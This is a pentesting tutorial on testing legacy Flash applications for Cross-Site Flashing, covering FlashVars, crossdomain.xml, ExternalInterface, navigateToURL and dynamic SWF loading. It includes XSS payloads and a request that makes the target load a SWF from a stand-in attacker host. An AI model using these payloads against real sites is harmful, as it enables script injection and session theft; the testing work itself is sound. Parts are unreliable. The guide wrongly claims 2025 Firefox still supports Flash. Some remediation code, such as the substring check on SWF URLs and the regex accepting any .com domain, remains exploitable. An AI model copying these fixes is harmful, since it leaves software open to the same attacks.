# Testing for Cross-Site Flashing (XSF) Vulnerabilities

## Overview

Testing for Cross-Site Flashing (XSF) vulnerabilities involves verifying that Adobe Flash-based web applications prevent the injection of malicious ActionScript code or manipulation of Flash objects due to improper input handling. According to OWASP (WSTG-CLNT-08), XSF vulnerabilities occur when user-controlled inputs (e.g., URL parameters, FlashVars, or external interfaces) are processed unsafely in Flash applications, allowing attackers to execute unauthorized scripts, steal data, or hijack sessions. This guide provides a hands-on methodology to identify and test XSF vulnerabilities, focusing on common attack vectors (e.g., unvalidated FlashVars, cross-domain policy misconfigurations, and external interface calls), with tools, commands, and remediation strategies.

**Impact**: XSF vulnerabilities can lead to:
- Execution of malicious ActionScript, compromising user data or sessions.
- Theft of sensitive information (e.g., cookies, authentication tokens).
- Unauthorized access to cross-domain resources.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

This guide aligns with OWASP’s WSTG-CLNT-08, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as injecting payloads into Flash applications may trigger security alerts or violate terms of service. 

**Note**: As of 2025, Adobe Flash is deprecated, but legacy systems may still use Flash, making XSF testing relevant for specific environments.

## Testing Tools

The following tools are recommended for testing XSF vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts HTTP requests and tests Flash parameters (e.g., FlashVars).
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to modify FlashVars or URL parameters.
  - **Note**: Check responses for Flash object rendering in Burp’s Render tab.

- **Zed Attack Proxy (ZAP) 3.0**: A proxy tool for intercepting requests and scanning for Flash-related vulnerabilities.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:11000`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser payload testing.
  - Use Active Scan with “Client-side Injection” scan rules to detect Flash issues.

- **SWF Decompiler (JPEXS Free Flash Decompiler)**: Decompiles SWF files to analyze ActionScript code.
  - Download from [JPEXS](https://www.free-decompiler.com/flash/).
  - Install on Windows/Linux/Mac:
    1. Extract the archive.
    2. Run `ffdec.sh` (Linux/Mac) or `ffdec.bat` (Windows).
  - Usage:
    - Open an SWF file and inspect ActionScript for user input handling.
  - **Tip**: Search for `ExternalInterface.call` or `navigateToURL` in decompiled code.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects Flash objects and network requests.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Elements tab to locate `<object>` or `<embed>` tags and Network tab to track SWF loading.
  - Example command to find Flash objects:
    ```javascript
    document.querySelectorAll('object, embed').forEach(e => console.log(e.outerHTML));
    ```
  - **Note**: Flash testing may require enabling legacy Flash support in Firefox (2025 versions still support it for testing).

- **cURL and HTTPie**: Send HTTP requests to test FlashVars or URL parameters.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/flash?flashvar=maliciousScript"
      # HTTPie
      http "http://example.com/flash?flashvar=maliciousScript"
      ```

- **Flash XSF Payloads**: Curated payloads for testing Flash vulnerabilities.
  - Sample payloads:
    - `javascript:alert('xss')`
    - `http://malicious.com/evil.swf`
    - `ExternalInterface.call('alert','xss')`
  - Resource: [OWASP Flash Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Flash_Security_Cheat_Sheet.html).
  - **Tip**: Test payloads in FlashVars or URL parameters and monitor behavior.

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-CLNT-08, testing XSF vulnerabilities across FlashVars, cross-domain policies, external interface calls, URL navigation, and dynamic SWF loading.

### 1. Test Unvalidated FlashVars

**Objective**: Ensure FlashVars parameters do not allow injection of malicious ActionScript or URLs.

**Steps**:
1. Identify FlashVars:
   - Use Elements tab to locate `<object>` or `<embed>` tags with `FlashVars` attributes.
   - Example: `<param name="FlashVars" value="var1=value">`.
2. Inject a malicious payload:
   ```bash
   http "http://example.com/flash?flashvar=javascript:alert('xss')"
   ```
3. Check for execution:
   - Load the page and observe for an alert pop-up.
   - Use Network tab to monitor unexpected requests.

**Example Secure Response**:
```html
<!-- Validated FlashVars prevent execution -->
<object data="app.swf">
  <param name="FlashVars" value="var1=safe">
</object>
```
No alert triggered.

**Example Vulnerable Response**:
```html
<!-- Unvalidated FlashVars execute script -->
<object data="app.swf">
  <param name="FlashVars" value="var1=javascript:alert('xss')">
</object>
```
Alert box displays "xss".

**Remediation**:
- Validate FlashVars:
  ```actionscript
  var safeVar:String = LoaderInfo(this.root.loaderInfo).parameters.var1;
  if (safeVar.match(/^[a-zA-Z0-9]+$/)) {
    useVar(safeVar);
  }
  ```
- Encode inputs:
  ```actionscript
  var encodedVar:String = escape(LoaderInfo(this.root.loaderInfo).parameters.var1);
  ```

**Tip**: Save FlashVars payloads and alert screenshots in a report.

### 2. Test Cross-Domain Policy Misconfigurations

**Objective**: Ensure `crossdomain.xml` does not allow unauthorized domains to access Flash resources.

**Steps**:
1. Check for `crossdomain.xml`:
   ```bash
   curl -i http://example.com/crossdomain.xml
   ```
2. Analyze policy:
   - Look for permissive settings (e.g., `<allow-access-from domain="*"/>`).
3. Test cross-domain access:
   - Host a malicious SWF on `http://malicious.com`.
   - Attempt to load resources from `example.com`:
     ```actionscript
     var request:URLRequest = new URLRequest("http://example.com/data");
     var loader:URLLoader = new URLLoader();
     loader.load(request);
     ```

**Example Secure Response**:
```xml
<?xml version="1.0"?>
<cross-domain-policy>
  <allow-access-from domain="trusted.com"/>
</cross-domain-policy>
```
No access for `malicious.com`.

**Example Vulnerable Response**:
```xml
<?xml version="1.0"?>
<cross-domain-policy>
  <allow-access-from domain="*"/>
</cross-domain-policy>
```
Access granted to any domain.

**Remediation**:
- Restrict domains:
  ```xml
  <cross-domain-policy>
    <allow-access-from domain="trusted.com"/>
  </cross-domain-policy>
  ```
- Disable if unnecessary:
  ```xml
  <cross-domain-policy>
    <site-control permitted-cross-domain-policies="none"/>
  </cross-domain-policy>
  ```

**Tip**: Save `crossdomain.xml` contents and cross-domain request logs in a report.

### 3. Test External Interface Calls

**Objective**: Ensure `ExternalInterface.call` does not execute unvalidated JavaScript.

**Steps**:
1. Decompile the SWF:
   - Open the SWF in JPEXS Decompiler.
   - Search for `ExternalInterface.call` in ActionScript.
2. Inject a payload via URL or FlashVars:
   ```bash
   http "http://example.com/flash?cmd=ExternalInterface.call('alert','xss')"
   ```
3. Check for execution:
   - Load the page and observe for an alert pop-up.

**Example Secure Response**:
```actionscript
// Validated input prevents execution
if (cmd.match(/^[a-zA-Z0-9]+$/)) {
  ExternalInterface.call(cmd);
}
```
No alert triggered.

**Example Vulnerable Response**:
```actionscript
// Unvalidated input executes JavaScript
ExternalInterface.call(cmd);
```
Alert box displays "xss".

**Remediation**:
- Validate inputs:
  ```actionscript
  if (cmd == "safeFunction") {
    ExternalInterface.call(cmd);
  }
  ```
- Avoid dynamic calls:
  ```actionscript
  ExternalInterface.call("fixedFunction");
  ```

**Tip**: Save decompiled ActionScript and alert screenshots in a report.

### 4. Test URL Navigation Functions

**Objective**: Ensure `navigateToURL` does not process unvalidated user inputs.

**Steps**:
1. Search for `navigateToURL`:
   - Decompile the SWF and locate `navigateToURL` calls.
2. Inject a malicious URL:
   ```bash
   http "http://example.com/flash?url=javascript:alert('xss')"
   ```
3. Check for execution:
   - Load the page and observe for an alert or redirect.

**Example Secure Response**:
```actionscript
// Validated URL prevents execution
if (url.match(/^https:\/\/example\.com/)) {
  navigateToURL(new URLRequest(url), "_self");
}
```
No alert triggered.

**Example Vulnerable Response**:
```actionscript
// Unvalidated URL executes script
navigateToURL(new URLRequest(url), "_self");
```
Alert box displays "xss".

**Remediation**:
- Validate URLs:
  ```actionscript
  if (url.match(/^https:\/\/[a-zA-Z0-9\.]+\.com$/)) {
    navigateToURL(new URLRequest(url), "_self");
  }
  ```
- Use static URLs:
  ```actionscript
  navigateToURL(new URLRequest("https://example.com"), "_self");
  ```

**Tip**: Document URL payloads and navigation behavior in a report.

### 5. Test Dynamic SWF Loading

**Objective**: Ensure dynamically loaded SWF files are not controlled by user inputs.

**Steps**:
1. Search for SWF loading:
   - Decompile the SWF and locate `Loader.load` or `URLLoader`.
2. Inject a malicious SWF URL:
   ```bash
   http "http://example.com/flash?swf=http://malicious.com/evil.swf"
   ```
3. Check for loading:
   - Monitor Network tab for requests to `malicious.com`.

**Example Secure Response**:
```actionscript
// Validated SWF source prevents loading
if (swfUrl.match(/^\/swf\/[a-zA-Z0-9]+\.swf$/)) {
  var loader:Loader = new Loader();
  loader.load(new URLRequest(swfUrl));
}
```
No request to `malicious.com`.

**Example Vulnerable Response**:
```actionscript
// Unvalidated source loads malicious SWF
var loader:Loader = new Loader();
loader.load(new URLRequest(swfUrl));
```
Network request to `malicious.com`.

**Remediation**:
- Validate SWF URLs:
  ```actionscript
  if (swfUrl.includes("example.com")) {
    loader.load(new URLRequest(swfUrl));
  }
  ```
- Use static SWF paths:
  ```actionscript
  loader.load(new URLRequest("/swf/trusted.swf"));
  ```

**Tip**: Save Network tab screenshots and decompiled ActionScript in a report.